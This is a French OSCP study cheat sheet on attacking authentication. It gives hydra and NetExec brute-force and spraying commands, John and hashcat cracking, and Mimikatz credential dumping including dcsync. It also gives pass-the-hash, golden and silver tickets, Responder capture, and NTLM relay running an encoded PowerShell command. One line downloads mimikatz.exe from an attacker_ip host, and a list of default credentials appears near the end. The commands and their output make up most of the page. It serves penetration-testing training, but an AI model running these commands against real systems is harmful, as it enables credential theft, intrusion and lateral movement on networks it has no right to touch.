---
title: "OSCP · Mots de passe et authentification"
description: "Analyser les mécanismes d'authentification et les formats de hachage."
---

# OSCP · Mots de passe et authentification

Analyser les mécanismes d'authentification et les formats de hachage.


## Essais de mots de passe


<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>

```bash
# SSH Brute Force
hydra -l <username> -P <wordlist> -s <port> ssh://<target_ip>

# FTP Brute Force
hydra -l <username> -P <wordlist> ftp://<target_ip>

# SMB Brute Force
hydra -L <user_list> -P <password_list> smb://<target_ip>

# Telnet Brute Force
hydra -l <username> -P <wordlist> telnet://<target_ip>

# MySQL Brute Force
hydra -l <username> -P <wordlist> mysql://<target_ip>

# PostgreSQL Brute Force
hydra -l <username> -P <wordlist> postgres://<target_ip>

# VNC Brute Force
hydra -P <password_list> vnc://<target_ip>

# HTTP Basic Authentication Brute Force
hydra -l <username> -P <wordlist> <target_ip> http-get /

# SMTP Brute Force
hydra -l <username> -P <wordlist> smtp://<target_ip>

# SNMP Brute Force
hydra -P <wordlist> snmp://<target_ip>

# Redis Brute Force
hydra -P <password_list> redis://<target_ip>

```


## Pulvérisation de mots de passe (Password Spraying)

Vérifier les comptes, les secrets et les mécanismes d'authentification.


<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>

```bash
# Spraying passwords for RDP, one wordlist could be: /usr/share/wordlists/dirb/others/names.txt
hydra -L <user_list> -p "<password>" rdp://<target_ip>

```


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
# WinRM password spraying
crackmapexec winrm <target_ip> -u <user_list> -H <hash_list>

# FTP password spraying
crackmapexec ftp <target_ip> -u <user_list> -p <password_list> -d <domain> --continue-on-success

# SMB password spraying
crackmapexec smb <target_ip> -u <user_list> -p <password_list> -d <domain> --continue-on-success

# RDP password spraying
crackmapexec rdp <target_ip> -u <user_list> -p "<password>" --continue-on-success

# SSH password spraying
crackmapexec ssh <target_ip> -u <user_list> -p <password_list> --d <domain> --continue-on-success

# Multiple targets with WinRM
crackmapexec winrm <target_ip_list> -u <user_list> -H <hash_list> -d <domain> --continue-on-success

# SMTP password spraying
crackmapexec smtp <target_ip> -u <user_list> -p <password_list> --continue-on-success

# POP3 password spraying
crackmapexec pop3 <target_ip> -u <user_list> -p <password_list> --continue-on-success

```


### Fichiers Office


<p class="oscp-command-note">Préparer une empreinte Office pour John.</p>

```bash
# Extraire le hash des fichiers Office chiffrés
office2john <file> > office.hash

# Mot de passe de fichier Crack Office en utilisant John
john --wordlist=<wordlist> office.hash

```


### Fichiers PDF


<p class="oscp-command-note">Préparer une empreinte pour John the Ripper.</p>

```bash
pdf2john <file.pdf> > pdf.txt

```


<p class="oscp-command-note">Analyser des empreintes avec John.</p>

```bash
john --wordlist=<wordlist> pdf.txt

```


<p class="oscp-command-note">Vérifier le mot de passe d&#x27;un document PDF.</p>

```bash
pdfcrack -f <file.pdf> -w <wordlist>

```


### Archives ZIP


<p class="oscp-command-note">Préparer une empreinte ZIP pour John.</p>

```bash
zip2john <file.zip> > zip.hash

```


<p class="oscp-command-note">Analyser des empreintes avec John.</p>

```bash
# (Facultatif), si le zip a trop de fichiers, ils en extraient un et craquent juste celui-là pour accélérer les choses. Si des erreurs sont données, supprimer le --format=zip.
john zip.hash --wordlist=<wordlist> --format=zip
# Autre possibilité
hashcat -m 13600 zip.hash /path/to/wordlist.txt

```


<p class="oscp-command-note">Vérifier le mot de passe d&#x27;une archive ZIP.</p>

```bash
# Effectuer une attaque de force brute sur un fichier ZIP protégé par mot de passe
fcrackzip -u -D -p <wordlist> <file.zip>

```


## Connexion HTTP POST

Examiner les entrées et les réponses de l'application web.


<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>

```bash
# HTTP POST brute-force using Hydra
hydra -l <username> -P <wordlist> <target_ip> http-post-form "/<login_uri>:<user_field>=<username>&<pass_field>=^PASS^:<failure_message>"

```




<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>/&lt;login_uri&gt;</code></p>




<p class="oscp-inline-ref"><strong>Paramètre de formulaire :</strong> <code>&lt;user_field&gt;=&lt;username&gt;&amp;&lt;pass_field&gt;=^PASS^</code></p>
```text
fm_usr=user&fm_pwd=^PASS^

```




<p class="oscp-inline-ref"><strong>Paramètre à remplacer :</strong> <code>&lt;failure_message&gt;</code></p>




```text
Login failed. Invalid

```


## Authentification HTTP Basic

Examiner les entrées et les réponses de l'application web.


<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>

```bash
# HTTP GET brute-force attack using Hydra
hydra -l <username> -P <wordlist> <target_ip> http-get /

```


## Estimer le temps de cassage d’un mot de passe


<p class="oscp-command-note">Afficher ou écrire une valeur.</p>

```bash
# Calculer l'espace de touche pour une longueur de mot de passe de <length>
echo -n "<characters>" | wc -c

python3 -c "print(<keyspace>**<length>)"

# Calculate cracking time based on benchmark results
python3 -c "print(<keyspace> / <hash_rate>)"

```


<p class="oscp-command-note">Script shell dans la rubrique « Estimer le temps de calcul ».</p>

```bash
# Estimation du temps de cassage d’un mot de passe alphanumérique de 5 caractères
characters="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

echo -n $characters | wc -c  # keyspace

python3 -c "print(62**5 / 1000000000)"  # example for 1B hashes per second

```


## Modification de listes de mots (Wordlists)


<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>

```bash
# Utilisation de Hashcat avec des attaques basées sur des règles
hashcat -m <hash_type> <hash_file> <wordlist> -r <rule_file> --force

```


## Modes de hachage Hashcat

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Paramètres et repères :**
`0` (MD5)  


**MD5**




<p class="oscp-inline-ref"><strong>Exemple de format d’empreinte :</strong> <code>$1$salt$hash</code></p>
**Paramètres et repères :**
`100` (SHA-1) · `hash:salt`  


**SHA-1**


**Paramètres et repères :**
`1000` (NTLM)  


**NTLM**




```text
<NTLM_HASH>

```


**Paramètres et repères :**
`5500` (NetNTLMv1) · `username::domain:challenge:response`  


**Net-NTLMv1**


**Paramètres et repères :**
`5600` (NetNTLMv2) · `username::domain:challenge:response`  


**Net-NTLMv2**


**Paramètres et repères :**
`3200` (bcrypt)  


**bcrypt**




<p class="oscp-inline-ref"><strong>Exemple de format d’empreinte :</strong> <code>$2a$10$abcdefghijklmnopqrstuv</code></p>
**Paramètres et repères :**
`13100` (Kerberos TGS-REP)  


**Kerberos 5 TGS-REP etype 23**




<p class="oscp-inline-ref"><strong>Exemple de format d’empreinte :</strong> <code>$krb5tgs$23$*user$realm$service*hash</code></p>
**Paramètres et repères :**
`18200` (Kerberos AS-REP)  


**Kerberos 5 AS-REP etype 23**




<p class="oscp-inline-ref"><strong>Exemple de format d’empreinte :</strong> <code>$krb5asrep$23$user@REALM:hash</code></p>
**Paramètres et repères :**
`1100` · `username:hash`  


**MS-Cache v1**


**Paramètres et repères :**
`2100`  


**MS-Cache v2**




```text
domain\username:hash:salt

```


**Paramètres et repères :**
`1400`  


**SHA-256**




```text
<SHA256_HASH>

```


**Paramètres et repères :**
`1700`  


**SHA-512**




```text
<SHA512_HASH>

```


**Paramètres et repères :**
`5500` (NetNTLMv1) · `username::domain:challenge:response`  


**NTLMv1-ESS**


**Paramètres et repères :**
`500`  


**MD5 Crypt**




<p class="oscp-inline-ref"><strong>Exemple de format d’empreinte :</strong> <code>$1$salt$hash</code></p>
**Paramètres et repères :**
`25600`  


**LDAP MD5**




```text
{MD5}hash

```


**Paramètres et repères :**
`13100` (Kerberos TGS-REP)  


**Kerberos TGS-REP etype 23**




<p class="oscp-inline-ref"><strong>Exemple de format d’empreinte :</strong> <code>$krb5tgs$23$user$realm$service$hash</code></p>
**Paramètres et repères :**
`18200` (Kerberos AS-REP)  


**Kerberos AS-REP etype 23**




<p class="oscp-inline-ref"><strong>Exemple de format d’empreinte :</strong> <code>$krb5asrep$23$user@realm:hash</code></p>
## Gestionnaires de mots de passe

Vérifier les comptes, les secrets et les mécanismes d'authentification.


<p class="oscp-command-note">Rechercher des fichiers avec PowerShell.</p>

```powershell
# Rechercher la base de données KeePass (.kdbx) sur Windows
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

```


<p class="oscp-command-note">Script shell dans la rubrique « Gestionnaires de mots de passe ».</p>

```bash
# Convert KeePass database to John format
keepass2john <Database.kdbx> > keepass.hash

# Rappelez-vous de supprimer le premier "'mot':" qui dit 'Database:'; il devrait ressembler à ceci:
# $keepass$*2*60*0*d7bfhs83hFTG338717d27a7d4sucgd54fvfv486d2...... INSTEAD OF Database:$keepass$*2*60*0*d7bfhs83hFTG338717d27a7d4sucgd54fvfv486d2......

# Crack KeePass hachage en utilisant Hashcat (la règle est facultative)
hashcat -m 13400 keepass.hash <wordlist> -r <rule_file> --force

```




```bash
# Ouvrir l'outil
kpcli --kdb=Database.kdbx

# Naviguez dans la base de données et le dossier souhaités avec le cd [folder]
cd Database/

# Afficher le contenu de la base de données
ls

# Afficher les informations sur les entrées
show [-f] [-a] <entry_id or entry_path>

# Afficher un détail de champ spécifique d'une entrée: (exemple) obtenir 'BACKUP Machine SSH Clé Passer ou obtenir 0 Pass
get <entry_path or entry_id> <field_name>

```


## Phrases secrètes SSH


<p class="oscp-command-note">Modifier les permissions d&#x27;un fichier.</p>

```bash
# Définir les permissions correctes pour la clé privée SSH
chmod 600 <id_rsa>

# Convert SSH key to John format
ssh2john <id_rsa> > ssh.hash

# Crack the SSH key passphrase
john --wordlist=<password_list> --rules=<rules_file> ssh.hash

```


## Empreintes Linux

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Paramètres et repères :**
`/etc/shadow`  


<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>

```bash
# 1. Identifiez le hash (peut utiliser hashes.com pour le faire), par exemple: root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7::: is a SHA-512 du fait du $6$ et utilise le mode -m 1800.

# 2. Remote la partie inutile, nous avons seulement besoin de la ':[HASH]:', donc dans l'exemple ci-dessus nous avons juste besoin de $6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.

# 3. Crack the hash
hashcat -m 1800 [hash_file].txt [path_to_wordlist]

```


### Sans identifiants

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Paramètres et repères :**
`privilege::debug` · `token::elevate`  


**Élévation de privilèges vers SYSTEM**


**Paramètres et repères :**
`lsadump::sam`  


**Extraction des empreintes de la SAM**


**Paramètres et repères :**
`lsadump::secrets`  


**Extraction des secrets LSA**


**Paramètres et repères :**
`lsadump::cache`  


**Extraction des identifiants de domaine en cache (DCC)**


**Paramètres et repères :**
`lsadump::trust`  


**Récupérer des informations sur l'authentification.**


**Paramètres et repères :**
`sekurlsa::tickets`  


**Extraction des tickets Kerberos**


**Extraction des secrets LSA**




```text
lsadump::lsa /inject

```


**Paramètres et repères :**
`sekurlsa::wdigest`  


**Extraction des identifiants WDigest**


**Paramètres et repères :**
`sekurlsa::logonpasswords`  


**Extraction des identifiants en clair**


**Paramètres et repères :**
`sekurlsa::msv`  


**Extraction des hashes NTLM depuis la mémoire LSASS**


**Paramètres et repères :**
`sekurlsa::kerberos`  


**Extraction des clés Kerberos**


**Paramètres et repères :**
`sekurlsa::ssp`  


**Extraction des identifiants SSP**


**Paramètres et repères :**
`sekurlsa::tspkg`  


**Extraction des identifiants TSPKG**


**Paramètres et repères :**
`privilege::list`  


**Afficher les privilèges disponibles**


**Extraction des mots de passe du coffre Windows (Windows Vault)**




```text
vault::cred /patch

```


**Extraction de la base SAM (Security Account Manager)**




```text
lsadump::sam /system:<SYSTEM> /sam:<SAM>

```


**Extraction des hashes Active Directory**




```text
lsadump::dcsync /domain:<DOMAIN> /user:<USERNAME>

```


### Avec identifiants

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Réutilisation d’un hash (Pass-the-Hash, PtH)**




```text
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:<COMMAND>

```


**Réutilisation d’un ticket Kerberos (Pass-the-Ticket, PtT)**




```text
kerberos::ptt <ticket.kirbi>

```


**Obtention de tickets via un hash ou une clé (Overpass-the-Hash / Pass-the-Key)**




```text
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /aes128:<AES128_HASH> /aes256:<AES256_HASH> /run:<COMMAND>

```


**Création d’un Golden Ticket (faux TGT)**




```text
kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:<RID> /ticket:<OUTPUT_TICKET>

```


**Création d’un Silver Ticket (faux ticket de service)**




```text
kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<SERVICE/SERVER> /service:<SERVICE> /rc4:<NTLM_HASH> /id:<USER_RID> /ptt

```


**Extraction des tickets Kerberos d’un utilisateur précis**




```text
sekurlsa::tickets /export

```


**Paramètres et repères :**
`misc::skeleton` · `mimikatz`  


**Injection d’une Skeleton Key**


**Création avancée d’un Silver Ticket Kerberos**




```text
kerberos::silver /user:<USERNAME> /domain:<DOMAIN> /target:<SERVER> /rc4:<NTLM_HASH> /service:<SERVICE> /sid:<DOMAIN_SID>

```


**Overpass-the-Hash avec une clé RC4**




```text
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM_HASH> /run:<COMMAND>

```


**Déchiffrement des identifiants protégés par DPAPI**




```text
dpapi::cred /in:<CREDENTIAL_FILE>

```


**Paramètres et repères :**
`kerberos::tgt`  


**Extraction d’un TGT depuis la mémoire LSASS**


### Commandes Mimikatz en une ligne (One-liners)


**Paramètres et repères :**
`Evil-WinRM` · `mimikatz`  


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
.\mimikatz.exe "privilege::debug" "[command]" "exit"

# Exemple pour les mots de passe de dumping (en utilisant cmd.exe ou PowerShell)
mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"

# Exemple pour passer le Hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:domain.local /rc4:HASH" "exit"

```




```powershell
mimikatz.exe "privilege::debug" "[command]" "exit" > C:\temp\mimikatz_output.txt

```


<p class="oscp-command-note">Script PowerShell pour exécuter Mimikatz en une ligne.</p>

```powershell
$command = "privilege::debug [command] exit"
$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
echo $encodedCommand

powershell -enc <encodedCommand>

```


<p class="oscp-command-note">Ouvrir une session distante WinRM.</p>

```powershell
# Mauvais-WinRM (nous devons nous connecter et ensuite l'exécuter, impossible de l'envoyer dans la même commande)
evil-winrm -i [target_ip] -u [username] -p [password]
mimikatz.exe 'privilege::debug' '[command]' 'exit'

# PsExec
impacket-psexec DOMAIN/username:password@target_ip "C:\\Windows\\System32\\mimikatz.exe 'privilege::debug' 'sekurlsa::logonPasswords' 'exit'"

# VMIExec
impacket-vmiexec DOMAIN/username:password@target_ip "C:\\Windows\\System32\\mimikatz.exe 'privilege::debug' 'sekurlsa::logonPasswords' 'exit'"

# Web Download
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://[attacker_ip]/mimikatz.exe', 'C:\\temp\\mimikatz.exe')"
powershell -Command "C:\\temp\\mimikatz.exe 'privilege::debug' '[command]' 'exit'"

```


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
mimikatz.exe "privilege::debug" "[command]" "exit" > nul 2>&1

```


## NTLM


<p class="oscp-command-note">Afficher les processus actifs.</p>

```powershell
PS C:\tools> .\mimikatz.exe
mimikatz # privilege::debug
Privilege '20' OK

```


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

mimikatz # lsadump::sam
Domain : <DOMAIN>
SysKey : <SysKey>
Local SID : <Local SID>

RID  : <RID>
User : <USERNAME>
Hash NTLM: <NTLM_HASH>

```


<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>

```bash
# Rule is optional
hashcat -m 1000 <NTLM_HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

```


<p class="oscp-command-note">Commande Impacket dans la rubrique « NTLM ».</p>

```bash
# Pass-the-Hash en utilisant SMBClient
impacket-smbclient -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>

```


## Réutilisation d’un hash NTLM (Pass-the-Hash)

Vérifier les comptes, les secrets et les mécanismes d'authentification.


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
...

mimikatz # lsadump::sam
RID  : <RID>
User : <USERNAME>
Hash NTLM: <NTLM_HASH>

```


<p class="oscp-command-note">Exécuter une commande distante via SMB.</p>

```bash
# Utilisation de smbclient
impacket-psexec -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>

# Utilisation de PsExec
impacket-psexec -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>

# Utilisation de WMIExec
impacket-wmiexec -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>

# Utilisation de xfreerdp
xfreerdp /v:<target_ip> /u:<USERNAME> /pth:<NTLM_HASH> /size:<resolution>

```


## Analyse des empreintes Net-NTLMv2




```text
<interface>

```


**Paramètres et repères :**
`eth0` · `wlan0`  




<p class="oscp-inline-ref"><strong>Paramètre à remplacer :</strong> <code>&lt;responder_ip&gt;</code></p>


<p class="oscp-inline-ref"><strong>Paramètre à remplacer :</strong> <code>&lt;victim_ip&gt;</code></p>


<p class="oscp-inline-ref"><strong>Paramètre à remplacer :</strong> <code>&lt;DOMAIN&gt;</code></p>


<p class="oscp-inline-ref"><strong>Paramètre à remplacer :</strong> <code>&lt;hash_file&gt;</code></p>


<p class="oscp-command-note">Observer les requêtes de résolution de noms.</p>

```bash
sudo responder -I <interface>

```


<p class="oscp-command-note">Script PowerShell pour analyser les empreintes Net-NTLMv2.</p>

```powershell
C:\Windows\system32> dir \\<responder_ip>\test
dir \\<responder_ip>\test
Access is denied.

```




```bash
[SMB] NTLMv2-SSP Client   : ::ffff:<victim_ip>
[SMB] NTLMv2-SSP Username : <DOMAIN>\emma
[SMB] NTLMv2-SSP Hash     : emma::<DOMAIN>:<NTLM_HASH>

```


**Paramètres et repères :**
`5600`  


<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>

```bash
hashcat -m 5600 <hash_file> /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.5) starting
...
<DOMAIN>\emma::<NTLM_HASH>:123Password123
...

```


## Relais d’authentification Net-NTLMv2 (NTLM Relay)


**Paramètres et repères :**
`ntlmrelayx`  




<p class="oscp-inline-ref"><strong>Paramètre à remplacer :</strong> <code>&lt;target_ip&gt;</code></p>


<p class="oscp-command-note">Commande Impacket dans la rubrique « Relaying Net-NTLMv2 ».</p>

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t <target_ip> -c "powershell -enc <base64_encoded_powershell_command_to_be_executed_on_the_target_machine>"

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections

```


<p class="oscp-command-note">Script shell dans la rubrique « Relaying Net-NTLMv2 ».</p>

```bash
[*] SMBD-Thread-4: Received connection from <victim_ip>, attacking target smb://<target_ip>
[*] Authenticating against smb://<target_ip> as <domain>/<username> SUCCEED
[*] SMBD-Thread-6: Connection from <victim_ip> controlled, but there are no more targets left!
...
[*] Executed specified command on host: <target_ip>

```


<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>

```bash
# Le port doit correspondre au port spécifié dans la commande shell inverse
nc -nvlp [port]

```




```powershell
# <responder_ip>: Adresse IP de la machine exécutant le serveur Responder.
C:\Windows\system32> dir \\<responder_ip>\test

```


## Identifiants par défaut (Default Credentials)

Vérifier les comptes, les secrets et les mécanismes d'authentification.


### Outil de référence des identifiants par défaut


<p class="oscp-command-note">Gérer les modules Python.</p>

```bash
sudo pip3 install defaultcreds-cheat-sheet

```


<p class="oscp-command-note">Script shell dans la rubrique « Database Tool ».</p>

```bash
creds search [service/web_server/term]

# Exemple :
creds search tomcat
+----------------------------------+------------+------------+
| Product                          |  username  |  password  |
+----------------------------------+------------+------------+
| apache tomcat (web)              |   tomcat   |   tomcat   |
| apache tomcat (web)              |   admin    |   admin    |
+----------------------------------+------------+------------+

```


```bash
creds search [service/web_server/term] export

```


```bash
creds update

```


```bash
# Recherche de produits creds
creds search [service/web_server/term] --proxy=http://localhost:8080

# Mettre à jour les enregistrements
creds update --proxy=http://localhost:8080

# Exemple : Rechercher des creds Tomcat et les résultats d'exportation vers /tmp/tomcat-usernames.txt , /tmp/tomcat-passwords.txt
creds search tomcat --proxy=http://localhost:8080 export

```


### Identifiants courants

Vérifier les comptes, les secrets et les mécanismes d'authentification.




```text
# Identifiants courants ou définis par défaut
root:root                # Identifiants root par défaut
admin@example.com:admin  # Identifiants administrateur courants pour des comptes de messagerie
admin:admin              # Identifiants classiques admin/admin
USERK:USERK              # Identifiants correspondant au nom de la machine cible
cassie:cassie            # Identifiants retrouvés avec ExifTool ou un outil similaire

# Autres identifiants par défaut
admin:password           # Identifiants courants admin/password
admin:1234               # Identifiants admin avec mot de passe numérique simple
administrator:admin      # Identifiants administrateur Windows courants
admin:admin123           # Variantes courantes du compte admin
guest:guest              # Identifiants du compte invité par défaut
user:user                # Identifiants utilisateur simples
test:test                # Identifiants du compte de test
support:support          # Identifiants du compte support par défaut
manager:manager          # Identifiants manager courants
operator:operator        # Identifiants du compte opérateur par défaut
service:service          # Identifiants du compte de service par défaut
postgres:postgres        # Identifiants PostgreSQL par défaut
mysql:mysql              # Identifiants MySQL par défaut

```


### Stratégies de cassage des mots de passe

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Paramètres et repères :**
`USERK:USERK` · `exiftool`  


## Listes de mots recommandées (Wordlists)


**Paramètres et repères :**
`/usr/share/wordlists/rockyou.txt`  




<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt</code></p>
<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>/usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt</code></p>
<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</code></p>
<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>
**Paramètres et repères :**
`/usr/share/dirb/wordlists/common.txt` · `/usr/share/dirb/wordlists/big.txt`  




<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt</code></p>
### Énumération


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
netexec smb target

```


```bash
# Vérifier l'accès SMB
netexec smb target -u '' -p ''

```


```bash
# Vérifier l'accès SMB
netexec smb target -u 'guest' -p ''

```


```bash
# Lister les partages SMB
netexec smb target -u '' -p '' --shares

netexec smb target -u [username] -p [password] --shares

netexec smb target --shares --policies

```


```bash
# Lister les groupes
netexec smb target --groups

```


```bash
# Lister les utilisateurs
netexec smb target -u '' -p '' --users

netexec smb target -u [username] -p [password] --users

netexec smb target -u '' -p '' --rid-brute

netexec smb target -u '' -p '' --rid-brute --rid-range 500-1100

```


### Pulvérisation de mots de passe (Password Spraying)


**FTP**

No check


**SSH**

Root (otherwise specific message) ✅


**WinRM**

Code execution at least 👾


**LDAP**

Path to domain admin 👑


**SMB**

Most likely local admin ✅


**RDP**

Code execution at least 👾


**VNC**

Code execution at least 👾


**WMI**

Most likely local admin ✅


**MSSQL**

------


**NFS**

------


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
netexec smb target -u [username] -p '[P@$$w0rd!]'
netexec smb target -u [username] -p 'password with spaces'

```


```bash
# Utilisation des mots de passe
netexec [protocol] [target(s)] -u [usernames].txt -p [passwords].txt

netexec [protocol] [target(s)] -u [usernames].txt -p [passwords].txt --local-auth

netexec [protocol] [target(s)] -u username1 -p password1 password2

netexec [protocol] [target(s)] -u username1 username2 -p password1

# Utilisation de NTLM Haches
netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt

netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt --local-auth

# SMB Specific
netexec smb target -u [usernames].txt -p [password] --continue-on-success

netexec smb target -u [usernames].txt -p [password]s.txt --no-bruteforce --continue-on-success

# SSH
netexec ssh target -u [username] -p [password] --continue-on-success

```


```bash
# Interroger le service avec NetExec
netexec [protocol] [target(s)] -u [usernames].txt -p [passwords.txt] --no-bruteforce

netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt --no-bruteforce

```




<p class="oscp-command-note">Exemples de couples utilisateur / mot de passe</p>

```text
user1 -> pass1
user2 -> pass2

```




```bash
# Vérifier l'accès SMB
netexec smb target -u [username] -p '[password]' --local-auth
netexec smb [target] -u [username] -H '[LM:NT]' --local-auth
netexec smb [target] -u [username] -H '[NTHASH]' --local-auth

# Exemples
netexec smb [target] -u '' -p '' --local-auth
netexec smb [target] -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth
netexec smb [target] -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth

```


**Paramètres et repères :**
`-k`  




```bash
# Vérifier l'accès SMB
netexec smb target -u [username] -p [password] -k

```


### SMB

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
netexec smb target -u [username] -p [password] --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol

```


```bash
# Utiliser le module spider_plus
netexec smb target -u [username] -p [password] -M spider_plus

netexec smb target -u [username] -p [password] -M spider_plus -o READ_ONLY=false

```


```bash
# Télécharger le fichier indiqué
netexec smb target -u [username] -p [password] -k --get-file target_file output_file --share sharename

```


### FTP

Transférer ou récupérer des fichiers dans le laboratoire.


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
netexec ftp target -u [username] -p [password] --ls

```


```bash
# Interroger le service avec NetExec
netexec ftp target -u [username] -p [password] --ls folder_name

```


```bash
# Interroger le service avec NetExec
netexec ftp target -u [username] -p [password] --ls folder_name --get file_name

```


### LDAP

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
netexec ldap target -u '' -p '' --users

```


```bash
# Lister les utilisateurs
netexec ldap target -u [username] -p [password] --trusted-for-delegation  --[password]-not-required --admin-count --users --groups

```


```bash
# Vérifier l'accès LDAP
netexec ldap target -u [username] -p [password] --kerberoasting kerb.txt

```


```bash
# Vérifier l'accès LDAP
netexec ldap target -u [username] -p [password] --asreproast asrep.txt

```


### MSSQL

Examiner les connexions, la configuration et les requêtes de la base de données.


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
netexec mssql target -u [username] -p [password]

```


**Paramètres et repères :**
`xp_cmdshell` · `-X` · `-x`  




```bash
# Exécuter une commande distante
netexec mssql target -u [username] -p [password] -x [command_to_execute]

```


```bash
# Télécharger le fichier indiqué
netexec mssql target -u [username] -p [password] --get-file output_file target_file

```


### Extraction de secrets avec SecretsDump


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
nxc smb target -u [username] -p [password] --sam

```




```bash
netexec smb target -u [username] -p [password] --local-auth --lsa

# Un compte dont le nom commence par _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7} peut être lié à un compte gMSA ; vérifier l'association avec la méthode ci-dessous.

```


```bash
# Examiner les données NTDS accessibles
netexec smb target -u [username] -p [password] --ntds

```




```bash
# Utilisation du module lsassy
nxc smb target -u [username] -p [password] -M lsassy

# Utilisation de nanodump
nxc smb target -u [username] -p [password] -M nanodump

# Utilisation de Mimikatz (déprécié) : vous avez besoin d'au moins un privilège d'administration local sur la cible distante, utilisez l'option --local-auth si votre utilisateur est un compte local
nxc smb target -u [username] -p [password] -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"

```




```bash
# Vérifier l'accès LDAP
netexec ldap target -u [username] -p [password] --gmsa-convert-id id

netexec ldap domain -u [username] -p [password] --gmsa-decrypt-lsa gmsa_account

```


```bash
# Utiliser le module gpp_[password]
netexec smb [target] -u [username] -p [password] -M gpp_[password]

```


```bash
# Vérifier l'accès SMB
netexec smb [target] -u [username] -p [password] --laps

```


**Paramètres et repères :**
`dpapi`  




```bash
# Vérifier l'accès SMB
netexec smb [target] -u [username] -p [password] --laps --dpapi

```


```bash
# Utiliser le module wifi
netexec smb [target] -u [username] -p [password] -M wifi

```




```bash
